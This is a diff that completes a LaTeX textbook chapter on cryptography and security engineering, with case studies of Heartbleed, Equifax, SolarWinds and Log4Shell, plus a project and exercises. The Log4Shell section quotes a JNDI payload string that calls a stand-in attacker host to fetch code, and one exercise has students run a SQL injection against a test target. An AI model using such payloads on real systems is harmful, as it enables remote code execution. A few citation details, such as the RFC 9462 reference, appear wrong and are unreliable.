@@ -1,40 +1,389 @@
 \chapter{Cryptography and security}
 \label{vol07:ch12}
 
-\epigraph{}{}
+\epigraph{The user's going to pick dancing pigs over security every time.}{Bruce Schneier, attributed}
 
-\chapmeta{Half-life: medium-life. Archetypes: interface, failure, ethics. Exercise target: 30. Project track: TBD (physical, simulation, household, or hybrid).}
+\chapmeta{Half-life: medium-life. Archetypes: interface, failure, ethics. Exercise target: 30. Project track: simulation.}
 
 \noindent
-\TODO{Volume 7, Chapter 12. Approx 110 pp.}
+Cryptography is the mathematical machinery for protecting information; security is the engineering practice for protecting systems. The two are not the same. Strong cryptography in a poorly-designed system is no defence; well-designed systems with weak cryptography are no better. This chapter teaches the working primitives (symmetric ciphers, public-key cryptography, hash functions, digital signatures, key exchange) and the engineering disciplines that turn primitives into secure systems. The standard references are Schneier and Ferguson's \emph{Cryptography Engineering} \cite{text:ferguson-schneier-kohno} and Boneh and Shoup's \emph{A Graduate Course in Applied Cryptography} \cite{text:boneh-shoup}.
 
-\section{Threat models}
-\TODO{Section prose.}
+\section{Threat models}\pathtag{core}
 
-\section{Symmetric cryptography}
-\TODO{Section prose.}
+A \engterm{threat model} is the explicit description of what the system defends against. The threat model names: the assets (what is being protected), the adversaries (who is attacking, with what resources), the trust boundaries (where the system trusts and where it does not), and the security properties (what must hold).
 
-\section{Public-key cryptography}
-\TODO{Section prose.}
+The discipline is to write the threat model down. Many security failures are not failures of mechanism but failures of model: the system defends against an adversary the designer imagined and is breached by an adversary the designer did not.
 
-\section{Hash functions, MACs, digital signatures}
-\TODO{Section prose.}
+\subsection{The standard adversary models}
 
-\section{Authentication, key exchange, TLS internals}
-\TODO{Section prose.}
+\textbf{Passive eavesdropper.} Reads messages but does not alter them. The classical wiretapper. Defended against by encryption.
 
-\section{Application security: injection, auth, supply chain}
-\TODO{Section prose.}
+\textbf{Active adversary.} Reads, modifies, drops, replays, injects messages. The classical man-in-the-middle. Requires authentication.
 
-\section{Side channels and physical attacks}
-\TODO{Section prose.}
+\textbf{Computationally bounded.} The adversary has polynomial time in the security parameter. Most cryptographic security proofs assume this.
 
-\section{Failure: Heartbleed, Equifax, SolarWinds, Log4Shell}
-\TODO{Section prose.}
+\textbf{Honest-but-curious.} The adversary follows the protocol but tries to learn more than it should. Relevant for shared-cloud and federated-learning settings.
 
+\textbf{Insider.} The adversary is a legitimate participant who abuses access.
 
-\section{Project}
-\TODO{implement a simple authenticated-encryption protocol; analyse threat model}
+\textbf{Quantum.} A future adversary with a large-scale quantum computer (Chapter 14). Affects only public-key cryptography (asymmetric encryption, signatures). Symmetric primitives at large key sizes are believed quantum-resistant.
+
+\subsection{CIA triad}
+
+The standard security properties: \engterm{confidentiality} (only authorised parties can read), \engterm{integrity} (data is not modified undetectably), \engterm{availability} (the service is reachable). Other properties (authenticity, non-repudiation, privacy, anonymity, accountability) extend the triad.
+
+The engineering discipline is to identify which properties each system component requires and to provide them with the right mechanism. Confidentiality without integrity is rarely useful; integrity without authentication is rarely useful; authentication without freshness is rarely useful.
+
+\section{Symmetric cryptography}\pathtag{core}
+
+\engterm{Symmetric cryptography} uses the same key for encryption and decryption. The dominant primitives in 2026:
+
+\textbf{AES (Advanced Encryption Standard).} A block cipher with $128$, $192$, or $256$-bit keys, operating on $128$-bit blocks. Standardised by NIST in 2001 (FIPS 197). Hardware-accelerated on essentially every modern CPU. The default symmetric cipher in industrial use.
+
+\textbf{ChaCha20.} A stream cipher with a $256$-bit key. Used in cases without AES hardware acceleration (mobile, embedded), where it can be faster than AES in software. Standardised in RFC 7539 (2015).
+
+\subsection{Modes of operation}
+
+A block cipher encrypts one fixed-size block; longer messages need a \engterm{mode of operation}. The modes are not interchangeable; each provides different properties.
+
+\textbf{ECB (electronic codebook).} Each block encrypted independently. The classical mode and the classical mistake: identical plaintext blocks become identical ciphertext blocks, revealing structure. Never use ECB for general data.
+
+\textbf{CBC (cipher block chaining).} Each block is XOR-ed with the previous ciphertext before encryption. Requires an initialisation vector (IV). Vulnerable to padding-oracle attacks when authentication is missing.
+
+\textbf{CTR (counter).} Each block's key stream is the encryption of a counter; the plaintext is XOR-ed with the key stream. Parallelisable; suitable for streaming.
+
+\textbf{GCM (Galois/Counter Mode).} Combines CTR encryption with a Galois-field-based authentication. Provides both confidentiality and integrity. The default mode for TLS 1.3 (with AES-GCM).
+
+\subsection{Authenticated encryption}
+
+\engterm{Authenticated encryption with associated data} (AEAD) is the modern standard. An AEAD construction encrypts the plaintext and authenticates both the plaintext and some additional data (headers, metadata) that is not encrypted. Decryption fails if the ciphertext or the associated data has been tampered with.
+
+The standard AEAD constructions: AES-GCM (TLS 1.3 default), ChaCha20-Poly1305 (mobile), AES-CCM (constrained devices). The engineering discipline is to use AEAD by default; do not separate encryption from authentication.
+
+\section{Public-key cryptography}\pathtag{core}
+
+\engterm{Public-key cryptography} uses two related keys: a public key (shared openly) and a private key (kept secret). The two-key structure enables encrypting to someone whose public key is known and verifying signatures from someone whose public key is known, without prior secret sharing.
+
+\subsection{RSA}
+
+RSA (Rivest, Shamir, Adleman, 1977) is the historical foundational public-key system. Security rests on the difficulty of factoring the product of two large primes.
+
+A key pair: choose two large primes $p, q$; compute $n = pq$; choose $e$ with $\gcd(e, \phi(n)) = 1$; compute $d = e^{-1} \bmod \phi(n)$. The public key is $(n, e)$; the private key is $d$.
+
+Encryption of message $m$: $c = m^e \bmod n$. Decryption: $m = c^d \bmod n$.
+
+RSA at $2048$-bit modulus has been the working standard since approximately $2010$. $3072$-bit is the recommended target for new deployments in 2026; $1024$-bit is broken and must not be used.
+
+\subsection{Elliptic-curve cryptography}
+
+Elliptic-curve cryptography (ECC) provides equivalent security at much smaller key sizes. $256$-bit ECC keys are roughly equivalent in security to $3072$-bit RSA. The dominant elliptic curves are NIST P-256 (FIPS 186-4), Curve25519 (RFC 7748), and Curve448.
+
+ECC is the modern default for new public-key deployments. TLS 1.3 supports ECDHE (elliptic-curve ephemeral Diffie-Hellman) for key exchange and ECDSA / EdDSA for signatures. The smaller key sizes reduce bandwidth, storage, and computation cost.
+
+\subsection{Post-quantum cryptography}
+
+Shor's algorithm (Chapter 14) breaks RSA, DSA, ECC, and all other classical public-key systems if a sufficiently large quantum computer is built. NIST began standardising post-quantum cryptographic algorithms in 2016; the first standards were published in 2024 (CRYSTALS-Kyber for key exchange, CRYSTALS-Dilithium for signatures). Industrial adoption is starting in 2026, primarily for ``harvest now, decrypt later'' threat models (encrypted data with long secrecy lifetimes).
+
+\section{Hash functions, MACs, digital signatures}\pathtag{standard}
+
+\subsection{Hash functions}
+
+A cryptographic \engterm{hash function} maps arbitrary-length input to a fixed-length output. The required properties:
+
+\textbf{Pre-image resistance.} Given $h$, finding $m$ with $H(m) = h$ is infeasible.
+
+\textbf{Second pre-image resistance.} Given $m_1$, finding $m_2 \neq m_1$ with $H(m_1) = H(m_2)$ is infeasible.
+
+\textbf{Collision resistance.} Finding any two $m_1 \neq m_2$ with $H(m_1) = H(m_2)$ is infeasible.
+
+The dominant cryptographic hashes in 2026: SHA-256 and SHA-3 (256-bit output, the default), BLAKE3 (high-throughput), the legacy MD5 and SHA-1 (broken, must not be used).
+
+\subsection{Message authentication codes}
+
+A \engterm{message authentication code} (MAC) takes a key and a message and produces an authenticator. Verifying the authenticator requires the key. MACs prove that the message originated from someone who knows the key and was not modified in transit.
+
+The standard MAC is HMAC (RFC 2104, 1997), built from any cryptographic hash. AEAD modes (Section 12.2) include MAC functionality.
+
+\subsection{Digital signatures}
+
+A \engterm{digital signature} is a MAC where verification requires only the public key. The signer uses the private key to sign; anyone with the public key can verify. The classical schemes: RSA signatures, DSA, ECDSA, EdDSA. Used for code signing, certificate authorities, software updates, blockchain transactions.
+
+\section{Authentication, key exchange, TLS internals}\pathtag{core}
+
+\subsection{Authentication factors}
+
+\textbf{Something you know.} Password, PIN, security question.
+
+\textbf{Something you have.} Hardware token (YubiKey), authenticator app, phone.
+
+\textbf{Something you are.} Biometric (fingerprint, face, iris).
+
+Multi-factor authentication combines at least two of the three. SMS-based ``second factor'' is widely deployed but weak (SIM swapping, SS7 interception); FIDO2 / WebAuthn hardware tokens are the strong modern standard.
+
+\subsection{Password storage}
+
+Passwords must not be stored in plaintext. The standard scheme: store a slow-to-compute hash (PBKDF2, bcrypt, scrypt, Argon2) of the password with a per-user salt. The slow computation defeats offline brute-force attacks; the salt defeats rainbow-table precomputation.
+
+\textbf{Argon2id} is the recommended modern choice (winner of the 2015 Password Hashing Competition). Tunable parameters allow the engineer to set the time and memory cost of each verification, deterring attackers with much greater hardware than the legitimate server.
+
+\subsection{Diffie-Hellman key exchange}
+
+\engterm{Diffie-Hellman} (1976) lets two parties agree on a shared secret over an insecure channel. The basic operation: Alice and Bob each generate a random secret; each computes a public value; each shares the public value; each combines its secret with the other's public value to compute the shared secret. An eavesdropper sees the public values but cannot compute the shared secret without one of the private secrets.
+
+Elliptic-curve Diffie-Hellman (ECDH) uses the same idea on elliptic curves with smaller key sizes. \engterm{Ephemeral} Diffie-Hellman (DHE, ECDHE) generates fresh keys for each session, providing \engterm{forward secrecy}: compromise of long-term keys does not compromise past session keys.
+
+\subsection{TLS 1.3}
+
+TLS 1.3 (RFC 8446, 2018) is the modern transport-security protocol. Its handshake establishes a session key in one round trip ($1$-RTT) or zero round trips ($0$-RTT for resumed connections):
+
+\begin{enumerate}[leftmargin=*]
+  \item \textbf{ClientHello.} Client sends its supported cipher suites, key-exchange parameters, and a key-exchange public value.
+  \item \textbf{ServerHello.} Server picks a cipher suite and sends its key-exchange public value plus its certificate (signed by a CA chain).
+  \item \textbf{Finished.} Both sides verify the handshake and derive the session key.
+\end{enumerate}
+
+TLS 1.3 removes legacy options (RSA key exchange without forward secrecy, weak cipher suites, MD5, SHA-1). Its design simplifies analysis and prevents many of the historical TLS vulnerabilities.
+
+\section{Application security: injection, auth, supply chain}\pathtag{standard}
+
+The OWASP Top Ten (last published 2021, 2026 edition forthcoming) enumerates the most common production web application vulnerabilities. The categories largely overlap with the topics below.
+
+\subsection{Injection}
+
+An injection vulnerability arises when attacker-controlled input is interpreted as code. The classes:
+
+\textbf{SQL injection.} Attacker input is concatenated into a SQL query. Remedy: parameterised queries (Chapter 9).
+
+\textbf{Command injection.} Attacker input is passed to a shell. Remedy: avoid shell execution; use argument-list APIs (\texttt{exec}, \texttt{spawn}) rather than \texttt{system}.
+
+\textbf{XSS (cross-site scripting).} Attacker input is rendered as HTML/JavaScript in another user's browser. Remedy: output escaping by default, content-security-policy headers.
+
+\textbf{Path traversal.} Attacker input is used as a filesystem path; the attacker uses ``../'' to access files outside the intended directory. Remedy: canonicalise paths and verify they remain within the allowed prefix.
+
+The pattern is universal: any boundary where attacker-controlled string crosses into a parsed language must defend against the parsing.
+
+\subsection{Authentication and session management}
+
+Strong authentication is necessary but not sufficient. The session token issued after authentication must be protected: short-lived, transmitted only over TLS, invalidated on logout, rotated on privilege change, bound to a device or session context where possible.
+
+Common failures: tokens in URLs (logged everywhere); tokens with no expiration; tokens not invalidated on password change; tokens predictable enough to guess; tokens persisting after logout.
+
+\subsection{Authorisation}
+
+Distinct from authentication. Authentication: who is making the request? Authorisation: what is the requester allowed to do?
+
+\textbf{Broken object-level authorisation (BOLA).} The classical failure: an API endpoint takes an object ID and returns the object, without checking that the authenticated user has access to that specific object. ``Authentication required'' is not enough; ``the user can see this specific resource'' must be enforced per resource.
+
+\subsection{Supply-chain security}
+
+A modern software system depends on hundreds or thousands of third-party libraries. Each is a potential attack vector. The classes:
+
+\textbf{Compromised package.} An attacker takes over a popular package and uploads a malicious version. The 2018 event-stream incident, the 2020 ua-parser-js incident.
+
+\textbf{Typosquatting.} An attacker registers a package with a name similar to a popular one (\texttt{reqeusts} vs \texttt{requests}); developers install the malicious one by typo.
+
+\textbf{Compromised build infrastructure.} An attacker compromises the build system used to produce trusted binaries. The 2020 SolarWinds incident is the canonical case (Section 12.8).
+
+The engineering response: pinned dependencies with cryptographic hashes (lock files), Software Bills of Materials (SBOM, RFC 9462 for SBOM in TLS), reproducible builds, supply-chain integrity frameworks (SLSA, in-toto), vulnerability databases (CVE, OSV).
+
+\section{Side channels and physical attacks}\pathtag{mastery}
+
+A \engterm{side-channel attack} exploits information that leaks from the implementation rather than from the cryptographic primitive. Chapter 7 named the speculative-execution side channels (Spectre, Meltdown). Other classes:
+
+\textbf{Timing.} The cryptographic operation takes different times for different inputs. A constant-time implementation does the same work regardless of the secret.
+
+\textbf{Power.} The power consumption varies with the secret. Defended against in hardware (smart cards, HSMs) by power-line filtering and dummy operations.
+
+\textbf{Electromagnetic.} EM emissions reveal internal state. Defended by shielding.
+
+\textbf{Acoustic.} Sound emissions reveal internal state. Used to extract RSA keys from a laptop in a 2014 paper (Genkin, Shamir, Tromer).
+
+\textbf{Cache.} As above (Spectre, Meltdown, cache-timing attacks against AES implementations).
+
+The engineering response is constant-time implementations of cryptographic primitives, hardware countermeasures where the threat warrants, and threat modelling that explicitly considers what the adversary's measurement capabilities are.
+
+\section{Failure: Heartbleed, Equifax, SolarWinds, Log4Shell}\pathtag{core}
+
+Four named failures illustrate the recurring patterns of security incidents in modern infrastructure.
+
+\subsection{Heartbleed (CVE-2014-0160)}
+
+The Heartbleed bug, disclosed in April 2014, was a buffer over-read in OpenSSL's TLS heartbeat extension. A malformed heartbeat request specified a payload length larger than the actual payload; the response copied that many bytes from server memory, leaking up to $64\,\si{\kibi\byte}$ of memory per request. The leaked memory could contain TLS session keys, user passwords, server private keys.
+
+The mechanism is a classical C bug: a missing bounds check on attacker-controlled length. OpenSSL had passed certification and code review; the bug had been in production for two years before discovery. The remediation was a patch to OpenSSL; the long-tail consequences (server certificates that had been exposed had to be reissued; affected services had to rotate all secrets that might have been in memory) took months.
+
+The engineering lesson: critical infrastructure depends on widely-used open-source libraries; bugs in those libraries affect everything that uses them; investment in those libraries' security (audits, static analysis, fuzzing) is underweighted relative to the consequence.
+
+\subsection{Equifax breach (2017)}
+
+In May 2017 Equifax, a major U.S.\ credit-reporting agency, was compromised through an unpatched Apache Struts vulnerability (CVE-2017-5638). The breach exposed personal information of approximately $147$ million people: names, social security numbers, dates of birth, addresses, driver's-license numbers.
+
+The vulnerability had a patch available; Equifax had not applied it. The engineering response: known vulnerabilities should be patched promptly; ``patch management'' is a discipline with metrics (time-to-patch), and the gap between patch availability and patch deployment is the working risk window.
+
+\subsection{SolarWinds (2020)}
+
+In 2020 attackers compromised the build infrastructure of SolarWinds, a network-management software vendor. The attackers injected a backdoor (Sunburst / Solorigate) into the Orion platform's signed binary. The compromised update was distributed to approximately $18\,000$ customers including the U.S.\ Treasury, the Department of Homeland Security, and many Fortune 500 companies.
+
+The mechanism was a supply-chain attack: the trusted build artifact was malicious. The engineering response: reproducible builds (so an independent third party can verify the build artifact), Software Bills of Materials, build-system isolation, signing of intermediate build artifacts (in-toto, SLSA).
+
+\subsection{Log4Shell (2021)}
+
+In December 2021 a remote-code-execution vulnerability was disclosed in the popular Log4j Java logging library (CVE-2021-44228). The vulnerability arose from Log4j's interpretation of certain syntax in logged strings: a string containing \texttt{\$\{jndi:ldap://attacker.example/exploit\}} caused Log4j to perform a JNDI lookup against the attacker's server, which returned executable code, which Log4j then executed.
+
+The vulnerability was exposed in countless services that logged user-controlled input (HTTP headers, user-agent strings, search queries). The patch arrived within days, but the breadth of affected systems and the time required to inventory dependencies meant that some systems remained vulnerable for months.
+
+The engineering lesson: a logging library should not interpret logged strings; a feature flag enabled by default that no application needed was a vulnerability waiting to be discovered. The wider lesson is supply-chain: the entire industry's dependency on Log4j made the vulnerability's blast radius enormous.
+
+\begin{principle}[Security is the property of the whole system]
+Cryptographic primitives, secure protocols, hardened operating systems, careful code, locked-down infrastructure: any one of these can be perfect and the system can still be insecure. Security is the property of the whole system under the threat model the engineer has named, and the threat model must include the parts the engineer does not control (libraries, build systems, operators, users). The engineering discipline is to write the threat model down, to identify the weakest link, and to strengthen it before the adversary finds it.
+\end{principle}
+
+\section{Project}\pathtag{core}
+
+\begin{project}[Implement a simple authenticated-encryption protocol]
+Implement a small encrypted-and-authenticated messaging protocol between two endpoints. The protocol should provide: confidentiality, integrity, mutual authentication, and forward secrecy.
+
+\begin{enumerate}[leftmargin=*]
+  \item Choose your primitives: a key-exchange (X25519 or ECDH P-256), a signature scheme (Ed25519 or ECDSA), an AEAD cipher (AES-GCM or ChaCha20-Poly1305).
+  \item Implement a one-message protocol: Alice encrypts a message to Bob; Bob verifies and decrypts.
+  \item Implement an interactive protocol: Alice and Bob perform an ephemeral key exchange, then exchange encrypted messages.
+  \item Write a threat model: which adversary capabilities your protocol defends against, which it does not.
+  \item Identify three implementation pitfalls (constant-time primitives, secure RNG, key zeroisation) and document how your implementation addresses each.
+\end{enumerate}
+
+The deliverable is the implementation, the threat model, and a short report (no more than four pages) on the design decisions. The report must explicitly identify which properties (confidentiality, integrity, authentication, forward secrecy, replay protection) your protocol provides and which it does not.
+\end{project}
 
 \section{Exercises}
-\TODO{Approximately 30 exercises across calculation, derivation, estimation, simulation, design, and judgement.}
+
+\subsection*{Calculation}\pathtag{core}
+
+\begin{exercise}
+A symmetric cipher has a $128$-bit key. Estimate the cost of a brute-force attack at $10^{18}$ operations per second.
+\end{exercise}
+
+\begin{exercise}
+RSA-$2048$ keys correspond to approximately what security level (in symmetric-cipher equivalent bits)? Compare to RSA-$3072$ and ECC-$256$.
+\end{exercise}
+
+\begin{exercise}
+A password is hashed with bcrypt at cost factor $10$ (about $0.1\,\si{\second}$ per verification). Compute the time to brute-force a 6-digit-numeric PIN. Compare to plain SHA-256.
+\end{exercise}
+
+\begin{exercise}
+A TLS 1.3 handshake takes one round-trip for a new connection. Compute the time-to-first-byte across a $100\,\si{\milli\second}$ link.
+\end{exercise}
+
+\subsection*{Derivation}\pathtag{standard}
+
+\begin{exercise}
+Show that Diffie-Hellman key exchange provides forward secrecy when the private keys are ephemeral. Identify the property the long-term keys must provide.
+\end{exercise}
+
+\begin{exercise}
+Derive informally the cost of birthday attacks on a hash function with $n$-bit output. State the implication for SHA-256 versus SHA-512.
+\end{exercise}
+
+\begin{exercise}
+Show that an AEAD scheme provides both confidentiality and integrity. State the security property it does not provide.
+\end{exercise}
+
+\begin{exercise}
+Show that a session token of length $n$ bits requires roughly $2^{n/2}$ guesses to find a collision. State the implication for $128$-bit versus $64$-bit session tokens.
+\end{exercise}
+
+\subsection*{Estimation}\pathtag{standard}
+
+\begin{exercise}
+Estimate the time for a $10$-MW data centre to brute-force a $128$-bit AES key.
+\end{exercise}
+
+\begin{exercise}
+Estimate the cost (in CPU cycles) of an AES-GCM encryption of a $1500$-byte packet on a modern CPU with AES-NI hardware.
+\end{exercise}
+
+\begin{exercise}
+Estimate the impact of a complete shift to post-quantum cryptography on TLS handshake size and latency.
+\end{exercise}
+
+\subsection*{Simulation}\pathtag{standard}
+
+\begin{exercise}
+Implement an AES-GCM encrypt/decrypt pair. Verify against test vectors.
+\end{exercise}
+
+\begin{exercise}
+Implement a small password-storage scheme using bcrypt. Verify resistance to offline brute-force at parameter choices of $10$, $12$, $14$.
+\end{exercise}
+
+\begin{exercise}
+Implement a simplified Diffie-Hellman key exchange. Verify that an attacker observing the public values cannot derive the shared secret.
+\end{exercise}
+
+\begin{exercise}
+Implement a SQL injection attack against a vulnerable example. Apply parameterised-query remediation. Verify the fix.
+\end{exercise}
+
+\subsection*{Design}\pathtag{standard}
+
+\begin{exercise}
+Design the password storage and authentication scheme for a web service with $10^7$ users.
+\end{exercise}
+
+\begin{exercise}
+Design the threat model for an Internet-facing API gateway. State the adversaries and the security properties.
+\end{exercise}
+
+\begin{exercise}
+Design the key-management strategy for a fleet of $10^5$ IoT devices.
+\end{exercise}
+
+\begin{exercise}
+Design the supply-chain security strategy for an open-source project with hundreds of dependencies.
+\end{exercise}
+
+\subsection*{Judgement}\pathtag{core}
+
+\begin{exercise}
+The Heartbleed bug was a missing bounds check in a critical library. State three engineering practices that would have caught it earlier.
+\end{exercise}
+
+\begin{exercise}
+The Equifax breach hinged on an unpatched vulnerability. State the engineering trade-offs between patching speed and stability.
+\end{exercise}
+
+\begin{exercise}
+The SolarWinds compromise illustrates supply-chain attack. State three engineering practices that would have mitigated the consequences.
+\end{exercise}
+
+\begin{exercise}
+Log4Shell was a feature in a logging library that interpreted logged strings. State the design principle this violates.
+\end{exercise}
+
+\begin{exercise}
+A team uses a custom-built cryptographic library because ``the standard ones are slow.'' Critique the choice.
+\end{exercise}
+
+\begin{exercise}
+A team is choosing between PBKDF2 and Argon2id for password hashing. State the engineering trade-offs.
+\end{exercise}
+
+\begin{exercise}
+A senior engineer argues that ``post-quantum cryptography is premature because no usable quantum computer exists.'' Critique the argument. State the threat model under which post-quantum cryptography matters today.
+\end{exercise}
+
+\begin{exercise}
+A team's authentication uses SMS as a second factor. State the engineering case for switching to FIDO2 hardware tokens.
+\end{exercise}
+
+\begin{exercise}
+A team's web service uses cookies for session management. State three engineering practices for protecting cookies that the team should verify are in place.
+\end{exercise}
+
+\begin{exercise}
+A senior engineer argues that ``security is the operations team's problem, not the developer's.'' Critique the argument. State the security responsibilities of the developer.
+\end{exercise}
+
+\begin{exercise}
+A team's threat model assumes only external adversaries. State three insider-threat scenarios and the engineering remediations for each.
+\end{exercise}
